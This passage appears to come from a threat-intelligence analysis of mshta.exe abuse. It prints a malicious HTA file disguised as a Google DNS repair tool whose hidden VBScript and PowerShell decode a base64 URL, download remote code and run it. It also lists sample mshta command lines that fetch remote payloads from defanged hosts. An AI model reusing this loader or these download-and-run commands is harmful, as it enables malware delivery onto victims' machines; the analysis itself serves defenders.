```html
<html>
<head>
<title>Google Reload DNS</title>
<HTA:APPLICATION ID="Google Repair" APPLICATIONNAME="B" BORDER="none" SHOWINTASKBAR="no" SINGLEINSTANCE="yes"
WINDOWSTATE="minimize">
</HTA:APPLICATION>
<script language="VBScript">
Option Explicit:Dim a:Set a=CreateObject("WScript.Shell"):Dim b:b="powershell -NoProfile -ExecutionPolicy Bypass -Command ""
{$U=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnRbLl1jb20vRGFzaW5pU3VtYW5hd2VlcmEvc2lsdmVyLWxhbXAvcmVmcy9oZWFkcy9tYWluL1JFREFDVEVELnR4dA=='))
$C=(Invoke-WebRequest -Uri $U -UseBasicParsing).Content
$B=[scriptblock]::Create($C)
$B}""":a.Run b,0,True:self.close
</script>
</head>
<body></body>
</html>
```
Additionally, here is a sampling of command-line invocation of mshta.exe commonly seen in the wild:

"mshta.exe" hXXps://rebekkaworm[.]snuggleam.org/time.json
"mshta.exe" hXXps://pwctrustlaw[.]com/Ray-verify.html
"C:\WINDOWS\system32\mshta.exe" hXXps://clicktogo[.]click/downloads/tra10
"mshta.exe" "C:\Users\redacteduser\Downloads\QcNezuts8lmKJKw.hta" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}
"mshta.EXE" vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -ExecutionPolicy Bypass & 'C:\Users\redacteduser\Documents\redacted.ps1'"", 0:close")
mshta C:\ProgramData\wBqERTofgffxGgvtPv.rtf

